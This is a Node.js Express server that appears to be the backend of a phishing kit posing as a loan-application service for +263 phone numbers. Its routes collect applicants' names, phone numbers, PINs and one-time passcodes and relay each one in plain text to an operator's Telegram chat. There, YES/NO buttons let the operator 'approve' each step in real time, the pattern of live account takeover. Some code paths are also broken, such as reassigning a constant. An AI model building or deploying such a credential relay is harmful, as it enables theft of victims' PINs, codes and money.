require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

const frontendPath = path.join(__dirname, '../frontend');
app.use(express.static(frontendPath));

app.get('/style.css', (req, res) => {
  res.sendFile(path.join(frontendPath, 'style.css'), {
    headers: { 'Content-Type': 'text/css' }
  });
});

// Config
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// In-memory store
const applications = {};   // appId -> application data
const appRefs = {};        // short ref -> appId

// Generate a short reference (6 chars)
function generateAppRef(appId) {
  const ref = Math.random().toString(36).substring(2, 8).toUpperCase();
  appRefs[ref] = appId;
  return ref;
}

// Telegram helper (plain text)
async function sendTelegramMessage(message, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text: message };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram API error:', data);
    } else {
      console.log('✅ Telegram message sent');
    }
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

// ─── API Routes ───

app.get('/api/health', (req, res) => res.json({ ok: true }));

app.post('/api/send-application', async (req, res) => {
  const data = req.body.applicationData;
  const appId = `${data.phone}_${Date.now()}`;
  const ref = generateAppRef(appId);

  applications[appId] = {
    ...data,
    pinStatus: 'pending',
    otpStatus: 'pending',
    pinAttempts: 0,
    maxPinAttempts: 3,
    pinBlockedUntil: null,
    createdAt: new Date().toISOString()
  };

  const message = `NEW LOAN APPLICATION\nID: ${appId}\nPhone: +263${data.phone}\nAmount: $${data.loanAmount}\nDuration: ${data.loanDuration} days\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, applicationId: appId, status: 'waiting_pin' });
});

app.post('/api/send-pin', async (req, res) => {
  const { applicationId, pin } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
    return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
  }
  if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
    app.pinAttempts = 0;
    app.pinBlockedUntil = null;
  }

  app.pin = pin;
  app.pinStatus = 'pending';
  const ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
  if (!ref) {
    // if ref lost (shouldn't happen), generate new one
    const newRef = generateAppRef(applicationId);
    appRefs[newRef] = applicationId;
    ref = newRef;
  }

  const message = `PIN VERIFICATION\nID: ${applicationId}\nPIN Entered: ${pin}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'pending' });
});

app.post('/api/send-otp', async (req, res) => {
  const { applicationId, otp } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.otp = otp;
  app.otpStatus = 'pending';
  const ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
  if (!ref) {
    const newRef = generateAppRef(applicationId);
    appRefs[newRef] = applicationId;
    ref = newRef;
  }

  const message = `OTP VERIFICATION\nID: ${applicationId}\nOTP Entered: ${otp}\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'pending' });
});

app.post('/api/resend-otp', async (req, res) => {
  const { applicationId } = req.body;
  const app = applications[applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  app.otpStatus = 'pending';
  const ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
  if (!ref) {
    const newRef = generateAppRef(applicationId);
    appRefs[newRef] = applicationId;
    ref = newRef;
  }

  const message = `OTP RESENT - ADMIN ACTION REQUIRED\nID: ${applicationId}\nNew OTP requested.\n\nApprove or reject:`;
  const buttons = [[
    { text: 'YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref }) },
    { text: 'NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref }) }
  ]];

  await sendTelegramMessage(message, buttons);
  res.json({ ok: true, status: 'otp_resent' });
});

app.get('/api/status/:applicationId/:step', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });

  let status = 'pending';
  let remainingAttempts = null;
  let blocked = false;

  if (req.params.step === 'pin') {
    status = app.pinStatus;
    remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
    blocked = app.pinStatus === 'blocked' || (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
  } else if (req.params.step === 'otp') {
    status = app.otpStatus;
  }

  res.json({ ok: true, status, remainingAttempts, blocked });
});

// ─── Telegram Webhook ───
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  console.log('📩 Webhook received');

  if (update.callback_query) {
    const query = update.callback_query;
    let callbackData;
    try {
      callbackData = JSON.parse(query.data);
    } catch (e) {
      console.error('Failed to parse callback_data:', query.data, e);
      return res.sendStatus(200);
    }

    const { a, s, ref } = callbackData;
    const appId = appRefs[ref];
    const app = applications[appId];
    if (!app) {
      console.error(`❌ App not found for ref: ${ref}`);
      return res.sendStatus(200);
    }

    console.log(`🔘 Processing callback: action=${a}, step=${s}, appId=${appId}`);

    if (s === 'PIN') {
      if (a === 'YES') {
        app.pinStatus = 'approved';
      } else {
        app.pinAttempts = (app.pinAttempts || 0) + 1;
        if (app.pinAttempts >= app.maxPinAttempts) {
          app.pinStatus = 'blocked';
          app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
        } else {
          app.pinStatus = 'rejected';
        }
      }
    } else if (s === 'OTP') {
      if (a === 'YES') {
        app.otpStatus = 'approved';
      } else {
        app.otpStatus = 'rejected';
      }
    }

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
    });

    await sendTelegramMessage(`Status Update\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
    return res.sendStatus(200);
  }

  if (update.message && update.message.text) {
    const text = update.message.text.trim();
    const chatId = update.message.chat.id;
    console.log(`💬 Message from ${chatId}: ${text}`);
    if (chatId.toString() === TELEGRAM_CHAT_ID) {
      if (text === '/stats') {
        const total = Object.keys(applications).length;
        await sendTelegramMessage(`Total applications: ${total}`);
      } else if (text === '/list') {
        const ids = Object.keys(applications).slice(-5);
        let msg = 'Recent applications:\n';
        ids.forEach(id => {
          const app = applications[id];
          msg += `${id} – ${app.phone} (PIN: ${app.pinStatus}, OTP: ${app.otpStatus})\n`;
        });
        await sendTelegramMessage(msg || 'No applications yet.');
      } else if (text === '/help') {
        await sendTelegramMessage('Commands: /stats, /list, /status');
      }
    }
  }

  res.sendStatus(200);
});

app.get('*', (req, res) => {
  res.sendFile(path.join(frontendPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
